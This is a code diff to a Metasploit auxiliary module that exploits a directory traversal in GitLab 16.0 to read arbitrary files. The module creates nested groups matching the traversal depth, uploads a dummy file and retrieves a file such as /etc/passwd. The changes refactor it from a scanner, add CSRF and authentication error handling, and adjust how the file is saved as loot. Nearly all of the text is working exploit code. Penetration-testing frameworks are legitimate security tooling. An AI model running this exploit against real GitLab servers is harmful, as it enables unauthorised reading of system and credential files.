@@ -6,7 +6,6 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HTTP::Gitlab
-  include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
 
   attr_accessor :cookie
@@ -17,11 +16,17 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'GitLab Authenticated File Read',
         'Description' => %q{
-          Gitlab version 16.0 contains an authenticated directory traversal for arbitrary file read as the gitlab user.
-          In order to exploit this vulnerability, a user must be able to create a project and groups.
-          When exploiting this vulnerability, a group (or subgroup under the group) must be created
-          for each level of the traversal. If the depth is 11 for the dir traversal, then a group
-          and 10 sub-groups will be created. Lastly a project is created for that subgroup.
+          GitLab version 16.0 contains a directory traversal for arbitrary file read
+          as the `gitlab-www` user. This module requires authentication for exploitation.
+          In order to use this module, a user must be able to create a project and groups.
+          When exploiting this vulnerability, there is a direct correlation between the traversal
+          depth, and the depth of groups the vulnerable project is in. The minimum for this seems
+          to be 5, but up to 11 have also been observed. An example of this, is if the directory
+          traversal needs a depth of 11, a group
+          and 10 nested child groups, each a sub of the previous, will be created (adding up to 11).
+          Visually this looks like:
+          Group1->sub1->sub2->sub3->sub4->sub5->sub6->sub7->sub8->sub9->sub10.
+          If the depth was 5, a group and 4 nested child groups would be created.
           With all these requirements satisfied a dummy file is uploaded, and the full
           traversal is then executed. Cleanup is performed by deleting the first group which
           cascades to deleting all other objects created.
@@ -52,18 +57,26 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),
         OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),
         OptInt.new('DEPTH', [ true, 'Depth for Path Traversal (also groups creation)', 11]),
-        OptString.new('File', [true, 'File to read', '/etc/passwd'])
+        OptString.new('FILE', [true, 'File to read', '/etc/passwd'])
       ]
     )
     deregister_options('GIT_URI')
   end
 
   def get_csrf(body)
+    if body.empty?
+      fail_with(Failure::UnexpectedReply, "HTML response had an empty body, couldn't find CSRF, unable to continue")
+    end
+
     body =~ /"csrf-token" content="([^"]+)"/
+
+    if ::Regexp.last_match(1).nil?
+      fail_with(Failure::UnexpectedReply, 'CSRF token not found in response, unable to continue')
+    end
     ::Regexp.last_match(1)
   end
 
-  def check_host(_ip)
+  def check
     # check method almost entirely borrowed from gitlab_github_import_rce_cve_2022_2992
     self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie
 
@@ -91,8 +104,17 @@ class MetasploitModule < Msf::Auxiliary
     return Exploit::CheckCode::Unknown("#{e.class} - #{e.message}")
   end
 
-  def run_host(ip)
-    self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie
+  def run
+    if datastore['DEPTH'] < 5
+      print_bad('A DEPTH of < 5 is unlikely to succeed as almost all observed installs require 5-11 depth.')
+    end
+
+    begin
+      self.cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) unless cookie
+    rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError
+      fail_with(Failure::NoAccess, 'Unable to authenticate, check credentials')
+    end
+
     fail_with(Failure::NoAccess, 'Unable to retrieve cookie') if cookie.nil?
 
     # get our csrf token
@@ -110,8 +132,12 @@ class MetasploitModule < Msf::Auxiliary
     first_group = ''
     (1..datastore['DEPTH']).each do |_|
       name = Rex::Text.rand_text_alphanumeric(8, 10)
-      first_group = name if first_group.empty?
-      vprint_status("Creating group: #{name} with parent id: #{parent_id}")
+      if first_group.empty?
+        first_group = name
+        vprint_status("Creating group: #{name}")
+      else
+        vprint_status("Creating child group: #{name} with parent id: #{parent_id}")
+      end
       # a success will give a 302 and direct us to /<group_name>
       res = send_request_cgi!({
         'uri' => normalize_uri(target_uri.path, 'groups'),
@@ -156,9 +182,10 @@ class MetasploitModule < Msf::Auxiliary
     })
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 302
-    csrf_token = get_csrf(res.body)
+    # csrf_token = get_csrf(res.body)
 
-    project_id = res.headers['Location'].to_s.split('/')[3..].join('/') # strip off http[s]://ip/, seems like there should be a better way to do this though
+    project_id = URI(res.headers['Location']).path
+
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, project_id)
     })
@@ -185,7 +212,10 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
     fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected response code (#{res.code})") unless res.code == 200
     res = res.get_json_document
-    file_url = res['link']['url']
+    file_url = res.dig('link', 'url')
+    if file_url.nil?
+      fail_with(Failure::UnexpectedReply, "#{peer} - Unable to determine file upload URL, possible permissions issue")
+    end
     # remove our file name
     file_url = file_url.gsub("/#{file_name}", '')
 
@@ -206,12 +236,12 @@ class MetasploitModule < Msf::Auxiliary
       print_error("#{peer} - Unexpected response code (#{res.code})") # don't fail_with so we can cleanup
     end
 
-    if !res.body.empty? && res.code == 200
-      print_good(res.body)
-      loot_path = store_loot('Gitlab file', 'text/plain', ip, res.body, datastore['FILE'])
-      print_good("#{datastore['FILE']} saved to #{loot_path}")
-    elsif res.body.empty?
+    if res.body.empty?
       print_error('Response has 0 size.')
+    elsif res.code == 200
+      print_good(res.body)
+      loot_path = store_loot('GitLab file', 'text/plain', datastore['RHOST'], res.body, datastore['FILE'])
+      print_good("#{datastore['FILE']} saved to #{loot_path}")
     else
       print_error('Bad response, initiating cleanup')
     end
